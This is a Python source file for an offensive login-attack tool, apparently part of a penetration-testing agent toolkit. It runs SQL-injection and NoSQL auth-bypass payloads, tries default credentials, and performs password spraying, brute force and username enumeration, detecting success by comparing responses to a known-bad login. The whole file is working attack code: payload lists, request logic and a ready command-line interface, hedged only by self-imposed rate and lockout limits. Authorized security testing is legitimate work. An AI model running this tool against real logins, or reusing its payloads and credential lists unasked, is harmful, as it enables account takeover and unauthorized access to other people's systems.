#!/usr/bin/env python3
"""auth_probe.py — owned login / auth-wall attack tool for pen_test.

The gap this fills: we could forge/crack a JWT but had nothing that actually
*attacks a login*. This does, on the shared _httpcore engine (session, proxy,
rate limit):

  bypass — fire the auth-bypass battery at a login: SQLi auth bypass, NoSQL
           operator injection, default/common credentials — and detect success
           by differential against a known-bad login (status/length/redirect/
           Set-Cookie/token), or an explicit --success/--fail marker.
  spray  — one password across many usernames (credential spraying), lockout-aware.
  brute  — many passwords against one username, lockout-aware.
  enum   — user-enumeration oracle: valid vs invalid username differential
           (message / status / timing) on login/reset/register.

Detection of "logged in" is the hard part: it baselines a definitely-wrong
credential first, then flags any attempt whose response diverges (got a session
cookie / token, redirected off the login, different status/size) — so you don't
need to know the app's success string, though --success-contains/--fail-contains
sharpen it.

DISCIPLINE (built in): authorized targets only; rate-limited; **lockout-aware**
(stops the moment a lockout signature appears); bounded (`--max`, warns on big
lists). This is controlled auth testing, never mass credential stuffing — keep
lists small and the target single and authorized. See agents/pen_test.md's gate.

Usage:
    auth_probe.py bypass -u https://app/login -X POST --location form \\
        --user-field username --pass-field password
    auth_probe.py spray  -u https://app/login -X POST --location json \\
        --user-field email --pass-field password --users users.txt --password 'Winter2026!'
    auth_probe.py brute  -u https://app/login ... --user admin --passwords small.txt
    auth_probe.py enum   -u https://app/login ... --users users.txt
"""

from __future__ import annotations

import argparse
import statistics
import time

import _httpcore as core

# Auth-bypass payloads. username field (and password where noted).
SQLI_BYPASS = [
    "' OR '1'='1", "' OR '1'='1'-- -", "admin'-- -", "admin'#",
    "' OR 1=1-- -", "') OR ('1'='1", "\" OR \"1\"=\"1",
]
NOSQL_BYPASS = [  # for --location json; value is spliced as the field value
    '{"$ne": null}', '{"$gt": ""}', '{"$regex": ".*"}',
]
DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
    ("administrator", "administrator"), ("root", "root"), ("root", "toor"),
    ("test", "test"), ("admin", "changeme"), ("admin", "Password1"),
    ("guest", "guest"), ("admin", "letmein"),
]
LOCKOUT_HINTS = ["locked", "too many", "try again later", "temporarily disabled",
                 "rate limit", "captcha", "account has been locked"]


def _login(client: core.Client, args, user: str, pw: str, *, raw_user=False):
    """One login attempt. raw_user=True splices user verbatim (for NoSQL/SQLi)."""
    loc = args.location
    fields = {}
    # start from any baseline body the operator passed
    if args.data:
        fields.update(core.parse_kv(args.data.split("&"), "="))
    body_json = None
    if loc == "json":
        import json as jsonlib
        body_json = jsonlib.loads(args.json) if args.json else {}
        # allow raw operator objects (NoSQL) by injecting parsed JSON values
        if raw_user and user.startswith("{"):
            body_json[args.user_field] = jsonlib.loads(user)
        else:
            body_json[args.user_field] = user
        if raw_user and pw.startswith("{"):
            body_json[args.pass_field] = jsonlib.loads(pw)
        else:
            body_json[args.pass_field] = pw
        return client.request(args.method, args.url, json=body_json,
                              headers={"Content-Type": "application/json"},
                              allow_redirects=False)
    else:
        fields[args.user_field] = user
        fields[args.pass_field] = pw
        return client.request(args.method, args.url, data=fields, allow_redirects=False)


def _has_session(r: core.Result) -> bool:
    h = {k.lower(): v for k, v in r.headers.items()}
    if "set-cookie" in h and any(t in h["set-cookie"].lower()
                                 for t in ("session", "token", "auth", "sid", "jwt")):
        return True
    body = r.text.lower()
    return any(t in body for t in ('"token"', '"access_token"', '"jwt"', 'bearer '))


def _success(r: core.Result, baseline: core.Result, args) -> bool:
    if not r.ok:
        return False
    if args.success_contains:
        return args.success_contains in r.text
    if args.fail_contains:
        return args.fail_contains not in r.text
    # heuristic: differs from the known-bad baseline in a login-meaningful way
    if _has_session(r) and not _has_session(baseline):
        return True
    if r.status in (301, 302, 303) and baseline.status not in (301, 302, 303):
        return True
    if r.status == 200 and baseline.status in (401, 403):
        return True
    # large body-size divergence (dashboard vs error) is a weaker signal
    if baseline.length and abs(r.length - baseline.length) / max(baseline.length, 1) > 0.5:
        return True
    return False


def _lockout(r: core.Result, args) -> bool:
    if args.lockout_contains:
        return r.ok and args.lockout_contains in r.text
    return r.ok and any(h in r.text.lower() for h in LOCKOUT_HINTS)


def _baseline(client, args):
    return _login(client, args, "definitely_not_a_user_zzz", "definitely_wrong_pw_zzz")


def run_bypass(client, args):
    base = _baseline(client, args)
    print(f"[baseline wrong-login] status={base.status} len={base.length} session={_has_session(base)}")
    hits = []
    print("\n[SQLi auth bypass] in the username field...")
    for p in SQLI_BYPASS:
        r = _login(client, args, p, "x", raw_user=True)
        ok = _success(r, base, args)
        print(f"  user={p!r:22s} status={r.status} len={r.length}  {'BYPASS?' if ok else '-'}")
        if ok: hits.append(f"SQLi user={p!r}")
    if args.location == "json":
        print("\n[NoSQL operator injection]...")
        for p in NOSQL_BYPASS:
            r = _login(client, args, p, '{"$ne": null}', raw_user=True)
            ok = _success(r, base, args)
            print(f"  user={p:22s} status={r.status} len={r.length}  {'BYPASS?' if ok else '-'}")
            if ok: hits.append(f"NoSQL user={p}")
    print("\n[default / common credentials]...")
    for u, pw in DEFAULT_CREDS:
        r = _login(client, args, u, pw)
        if _lockout(r, args):
            print("  [!] lockout signature — stopping default-cred phase."); break
        ok = _success(r, base, args)
        print(f"  {u}:{pw:12s} status={r.status} len={r.length}  {'VALID?' if ok else '-'}")
        if ok: hits.append(f"default cred {u}:{pw}")
    print("\n" + "=" * 60)
    if hits:
        print("[!] AUTH-BYPASS CANDIDATE(s):")
        for h in hits: print(f"    {h}")
        print("  Confirm end-to-end per knowledge/exploitation_depth.md: log in with it and\n"
              "  capture the authenticated resource (REAL data), not just the differential.")
    else:
        print("[-] No bypass signal. Try other fields/locations; see knowledge/auth_bypass.md.")


def _load_list(path):
    with open(path, encoding="utf-8", errors="replace") as f:
        return [l.strip() for l in f if l.strip()]


def run_spray(client, args):
    users = _load_list(args.users)[: args.max]
    base = _baseline(client, args)
    print(f"[spray] '{args.password}' across {len(users)} users (rate={args.rate or 'none'}, max={args.max})")
    print("  DISCIPLINE: one password, small user list, lockout-aware — not mass stuffing.")
    valid = []
    for u in users:
        r = _login(client, args, u, args.password)
        if _lockout(r, args):
            print(f"  [!] lockout at user={u} — STOPPING (respect the lockout)."); break
        if _success(r, base, args):
            print(f"  VALID: {u}:{args.password}"); valid.append(u)
    print(f"\n{len(valid)} valid credential(s). Confirm login + capture real authed data (exploitation_depth.md).")


def run_brute(client, args):
    pws = _load_list(args.passwords)[: args.max]
    base = _baseline(client, args)
    print(f"[brute] user={args.user} × {len(pws)} passwords (rate={args.rate or 'none'}, max={args.max})")
    for pw in pws:
        r = _login(client, args, args.user, pw)
        if _lockout(r, args):
            print(f"  [!] lockout after several attempts — STOPPING. (A finding in itself if it never locks.)"); break
        if _success(r, base, args):
            print(f"  VALID: {args.user}:{pw}"); return
    print("  no valid password in the list (or lockout stopped us). Note whether lockout ever engaged.")


def run_enum(client, args):
    users = _load_list(args.users)[: args.max]
    print(f"[user-enum oracle] {len(users)} candidates — comparing valid vs invalid responses")
    # timing + response differential
    rows = []
    for u in users:
        samples = []
        for _ in range(2):
            t0 = time.monotonic()
            r = _login(client, args, u, "wrong_pw_for_enum_zzz")
            samples.append((time.monotonic() - t0, r))
        dt = statistics.mean(s[0] for s in samples)
        r = samples[-1][1]
        rows.append((u, r.status, r.length, dt, r.text[:80].replace("\n", " ")))
    # a distinct (status,len) or clearly higher timing for some users = enumeration
    sig = {}
    for u, st, ln, dt, snip in rows:
        sig.setdefault((st, ln), []).append(u)
        print(f"  {u:24s} status={st} len={ln} t={dt:.2f}s")
    print("\n" + "=" * 60)
    if len(sig) > 1:
        print("[!] USER-ENUM CANDIDATE — responses cluster into distinct shapes by username:")
        for (st, ln), us in sig.items():
            print(f"    ({st},{ln}): {len(us)} user(s) e.g. {us[:3]}")
        print("  Confirm the oracle distinguishes real vs fake accounts; feeds spray/brute.")
    else:
        print("[-] Uniform responses — no obvious enumeration oracle (check timing deltas manually).")


def main():
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = p.add_subparsers(dest="mode", required=True)

    def common(sp):
        sp.add_argument("-u", "--url", required=True)
        sp.add_argument("-X", "--method", default="POST")
        sp.add_argument("--location", default="form", choices=["form", "json"])
        sp.add_argument("--user-field", default="username")
        sp.add_argument("--pass-field", default="password")
        sp.add_argument("--data", help="baseline form fields k=v&k=v (e.g. a CSRF token)")
        sp.add_argument("--json", help="baseline JSON body")
        sp.add_argument("--success-contains", help="string present ONLY on success")
        sp.add_argument("--fail-contains", help="string present ONLY on failure")
        sp.add_argument("--lockout-contains", help="string that means we got locked/blocked")
        sp.add_argument("--max", type=int, default=50, help="cap attempts/list size (keep it small)")
        core.add_common_args(sp)

    b = sub.add_parser("bypass", help="SQLi/NoSQL/default-cred auth-bypass battery"); common(b)
    s = sub.add_parser("spray", help="one password across many users"); common(s)
    s.add_argument("--users", required=True); s.add_argument("--password", required=True)
    br = sub.add_parser("brute", help="many passwords vs one user"); common(br)
    br.add_argument("--user", required=True); br.add_argument("--passwords", required=True)
    e = sub.add_parser("enum", help="username enumeration oracle"); common(e)
    e.add_argument("--users", required=True)

    args = p.parse_args()
    core.require_scheme(args.url)
    client = core.client_from_args(args)
    {"bypass": run_bypass, "spray": run_spray, "brute": run_brute, "enum": run_enum}[args.mode](client, args)


if __name__ == "__main__":
    main()
